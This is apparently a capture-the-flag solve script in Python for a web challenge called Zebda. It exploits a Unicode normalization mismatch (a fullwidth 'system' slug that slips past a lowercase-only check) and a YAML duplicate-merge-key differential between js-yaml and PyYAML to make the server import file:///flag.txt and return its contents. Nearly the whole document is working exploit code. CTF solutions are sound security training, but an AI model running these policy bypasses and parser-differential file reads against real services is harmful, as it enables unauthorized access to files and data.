#!/usr/bin/env python3
"""Solve Zebda via the Unicode policy bypass and YAML merge differential."""

import argparse
import json
import os
import sys
from urllib.request import Request, urlopen


DEFAULT_TARGET = "https://zebda.instances.ctf.l3ak.team"


def request_json(url, method="GET", body=None):
    data = None if body is None else json.dumps(body).encode()
    headers = {"Accept": "application/json"}
    if data is not None:
        headers["Content-Type"] = "application/json"
    req = Request(url, data=data, headers=headers, method=method)
    with urlopen(req, timeout=15) as response:
        return json.loads(response.read().decode())


def request_yaml(url, manifest):
    req = Request(
        url,
        data=manifest.encode(),
        headers={"Content-Type": "text/yaml", "Accept": "application/json"},
        method="POST",
    )
    with urlopen(req, timeout=20) as response:
        return json.loads(response.read().decode())


def main():
    parser = argparse.ArgumentParser(description="Solve the Zebda web challenge")
    parser.add_argument("-u", "--url", default=os.getenv("TARGET", DEFAULT_TARGET))
    args = parser.parse_args()
    target = args.url.rstrip("/")

    # NFKC + casefold in the worker turns this into "system". The middleware
    # only applies lowercase, so it does not reject the project name.
    project = request_json(
        f"{target}/api/projects",
        method="POST",
        body={"slug": "ｓｙｓｔｅｍ"},
    )
    project_id = project["id"]

    # js-yaml keeps the first duplicate merge mapping. PyYAML flattens both
    # mappings and the second one wins in the worker.
    manifest = (
        "job:\n"
        "  <<: {action: translate, source: https://example.com/x}\n"
        "  <<: {action: import, source: file:///flag.txt}\n"
    )
    build = request_yaml(f"{target}/api/projects/{project_id}/builds", manifest)
    if build.get("status") != "success":
        raise RuntimeError(f"build failed: {build}")

    artifact = build.get("artifact")
    if not artifact:
        raise RuntimeError(f"no artifact in response: {build}")
    print(artifact)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        sys.exit(1)
